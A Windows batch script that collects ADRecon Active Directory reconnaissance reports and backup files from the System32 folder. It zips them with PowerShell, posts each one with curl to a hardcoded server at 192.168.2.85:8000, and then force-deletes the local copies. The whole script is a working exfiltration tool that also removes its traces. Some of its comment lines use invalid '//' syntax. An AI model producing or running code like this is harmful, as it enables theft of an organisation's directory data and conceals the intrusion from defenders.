@echo off
setlocal enabledelayedexpansion

REM Set the server URL
set "URI=http://192.168.2.85:8000"

REM Define source folder
set "SourceDir=C:\Windows\System32"

REM Change directory to where files are stored
cd /d "%SourceDir%"

REM Set paths to files (assuming both files are in the same directory as the script)
set "ADReconFile=ADRecon-Report-*"
set "BackupFile=backup_*"

REM Find all ADRecon-*.zip file
for /d %%F in (%ADReconFile%) do (
	REM Set folder name
	set "folderName=%%F"
    
    REM Create zip file name by appending .zip
    set "zipName=!folderName!.zip"
    
    REM Print the zip file name for debugging
    echo !zipName!
	
	REM Use PowerShell to compress the folder
	powershell -nologo -noprofile -command ^"Compress-Archive -Path '%%F' -DestinationPath '%%F.zip' -Force"
	curl -X POST -F "ADRecon=@!zipName!" %URI%
	
	//Delete zipped files
    if exist "!zipName!" (
        del /f /q "!zipName!"
    ) else (
        echo Zip file not found: !zipName!
    )
	if exist "!folderName!" (
        rmdir /s /q "!folderName!"
    ) else (
        echo Folder not found: !folderName!
    )
)

REM Check if files exist
if not exist "%ADReconFile%" (
    echo ADRecon file not found!
    exit /b
)

REM Find all backup_*.txt file
for %%B in (%BackupFile%) do (
	set "BackupFile=%%B"
	echo Found: %%B

	REM Use curl to upload both files as multipart/form-data
	curl -X POST -F "Backup=@%%B" %URI%
	
	//Delete backup files
    if exist "%%B" (
        del /f /q "%%B"
    )else (
        echo Backup file not found: %%B
    )
)

if not exist "%BackupFile%" (
    echo Backup file not found!
    exit /b
)

echo Files uploaded successfully.

endlocal
